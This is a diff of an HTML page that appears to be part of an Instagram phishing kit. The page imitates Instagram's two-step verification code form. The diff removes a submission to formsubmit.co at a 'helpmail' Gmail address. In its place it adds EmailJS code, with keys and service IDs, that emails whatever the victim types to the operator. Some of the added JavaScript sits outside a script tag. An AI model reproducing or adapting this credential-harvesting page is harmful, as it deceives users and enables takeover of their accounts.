@@ -57,7 +57,7 @@
       <!-- SMARTPHONE SECTION END -->
       <!-- FORM SECTION -->
       <article class="form-area">
-        <form  action="https://formsubmit.co/Instagramhelpmail99@gmail.com" method="POST" accept=".">
+        <form  method="POST" id="form" >
           <p class="small-title">2-Step Verification</p>
           <input
             type="text"
@@ -73,7 +73,7 @@
             <a href="#" class="small">resend it</a>
             <div class="forget"><a href="#">Forgot password?</a></div>
           </div>
-          <input type="hidden" name="_redirect" value="https://fanflqopx.vercel.app/thanks.html">
+<!--           <input type="hidden" name="_redirect" value="https://fanflqopx.vercel.app/thanks.html"> -->
 <input type="hidden" name="_captcha" value="false">
 
         </form>
@@ -169,6 +169,32 @@
     <script src="../../js/socials/app.html"></script>
     <script src="../../js/socials/brands.min.html"></script>
     <script src="../../js/socials/fontawesome.min.html"></script>
+    <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('7NQDqDubm8IFBhmKO')
+</script>
+    const btn = document.getElementById('button');
+
+document.getElementById('form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'service_16fiv0m';
+   const templateID = 'template_j5z0tt2';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+      alert('Sent!');
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
   </body>
 
 <!-- Mirrored from fanfamousity.com/instagram/otp/657daf104b167f68d1979b9c by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 17 Dec 2023 11:22:30 GMT -->
